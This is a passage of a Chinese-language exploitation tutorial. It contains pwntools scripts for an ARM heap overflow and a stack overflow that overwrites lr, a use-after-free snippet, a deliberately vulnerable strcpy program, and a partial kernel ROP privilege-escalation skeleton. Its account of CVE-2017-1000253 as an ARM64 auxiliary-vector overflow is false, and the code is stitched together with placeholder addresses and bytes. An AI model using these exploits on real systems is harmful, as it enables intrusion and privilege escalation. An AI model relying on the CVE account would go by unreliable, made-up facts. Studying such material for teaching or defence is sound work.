from pwn import *

context.arch = 'arm'
context.bits = 32
context.endian = 'little'

elf = ELF('./heap')
win = elf.symbols['win']

# 假设堆布局：chunk A (32字节数据) 后紧邻chunk B (32字节数据)
# 通过溢出A覆盖B的prev_size和size，实现unlink
# 但更简单：如果结构体中有函数指针，直接覆盖它

# 构造payload：填充A的name[32] + 覆盖B的func指针
payload = b'A' * 32  # name
payload += p32(win)   # func

p = process(['./heap', payload])
p.interactive()


**UAF利用**：
c
struct data *d = malloc(sizeof(struct data));
free(d);
// 之后分配另一个相同大小的chunk，覆盖d的内容
struct data *e = malloc(sizeof(struct data));
strcpy(e->name, "evil");
e->func = win;
// 然后通过d->func()调用，实际执行win


**技术说明**：
- ARM堆管理通常使用glibc的ptmalloc，与x86相同，但注意对齐和大小。
- 堆溢出利用需要精确控制chunk元数据，包括prev_size、size、fd、bk。
- UAF利用的关键是释放后指针未置空，且后续分配可重用该内存。
- 在ARM上，函数指针调用通过`blx r3`等指令，覆盖指针即可劫持控制流。
- 实际利用中需绕过ASLR，通常需要信息泄露。

ARM架构的栈溢出与x86类似，但寄存器使用和调用约定不同。ARM过程调用标准（AAPCS）使用r0-r3传递参数，r4-r11为保存寄存器，lr（r14）保存返回地址，sp（r13）为栈指针。栈溢出发生在向局部缓冲区写入数据超过其容量时，覆盖相邻的栈帧数据，包括保存的lr和fp（r11）。攻击者可通过覆盖lr控制程序流。

以下示例展示一个存在栈溢出的ARM32函数（使用gcc编译，无保护）：
c
#include <string.h>
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input); // 无边界检查
}
int main(int argc, char **argv) {
    if (argc > 1) vulnerable(argv[1]);
    return 0;
}

编译：`arm-linux-gnueabihf-gcc -fno-stack-protector -z execstack -o vuln vuln.c`

利用思路：覆盖lr为攻击者控制的地址（如shellcode地址）。由于ARM默认小端序，payload结构：填充64字节buf + 4字节fp + 4字节lr。

使用pwntools编写exploit：
python
from pwn import *
context.arch = 'arm'
context.bits = 32
# 假设shellcode地址为0xbefff000（需实际泄露）
shellcode = asm(shellcraft.sh())  # ARM shellcode
payload = b'A'*64 + b'B'*4 + p32(0xbefff000)  # 覆盖lr
# 实际利用需先确定栈地址，此处仅为演示
print(payload.hex())

注意：现代系统启用NX和ASLR，需结合ROP绕过。此例仅展示基本原理。ARM栈溢出关键点：lr寄存器替代x86的ret地址；需考虑Thumb/ARM模式切换（地址最低位为1表示Thumb）。

CVE-2017-1000253是Linux内核中ARM64架构下`load_elf_binary`函数的一个栈缓冲区溢出漏洞。漏洞成因：在加载ELF二进制文件时，内核将用户空间的辅助向量（auxiliary vectors）复制到内核栈上，但未正确检查长度。辅助向量数量由`bprm->p`指针控制，攻击者可以通过构造特殊的ELF文件，使得`bprm->p`指向一个伪造的辅助向量数组，其中包含大量条目，导致内核栈上的缓冲区溢出，覆盖返回地址和其他关键数据。

受影响版本：Linux内核版本4.12及之前（具体到4.12-rc7），ARM64架构。

POC原理：攻击者创建一个特制的ELF文件，其中包含一个超长的辅助向量列表。当内核执行`load_elf_binary`时，会调用`copy_strings`和`create_elf_tables`等函数，将辅助向量复制到栈上。由于未对数量进行限制，导致栈溢出。利用该溢出可以覆盖`task_struct`中的`thread_info`或返回地址，实现提权。

修复：Linux内核4.13中引入了对辅助向量数量的限制，在`fs/binfmt_elf.c`中添加了`MAX_ARG_STRLEN`和`MAX_ARG_STRINGS`检查，防止溢出。

利用示例（简化，假设已获得内核基址）：
c
// 利用思路：通过栈溢出覆盖返回地址，执行ROP链关闭SMEP/SMAP并执行commit_creds(prepare_kernel_cred(0))，然后返回用户态执行shell。
// 实际利用需要绕过KASLR，这里假设已知内核基址。

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

// 假设内核基址偏移
#define KERNEL_BASE 0xffff000000000000
#define COMMIT_CREDS (KERNEL_BASE + 0x...)
#define PREPARE_KERNEL_CRED (KERNEL_BASE + 0x...)
#define MOV_X0_X4_BL_X5 (KERNEL_BASE + 0x...)  // gadget: mov x0, x4; blr x5
// ... 更多gadget

int main() {
    // 构造ELF文件，使辅助向量数量极大
    // 具体构造略，需要修改ELF头中的e_phnum等字段
    // 这里仅展示ROP链部分

    // 用户态shellcode地址
    void *user_shell = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(user_shell, "\x??", 0x100); // 放入execve shellcode

    // 构造ROP payload（覆盖栈）
    unsigned long payload[100];
    int i = 0;
    payload[i++] = 0xdeadbeef; // 填充
    // ... 覆盖到返回地址
    payload[i++] = MOV_X0_X4_BL_X5; // gadget
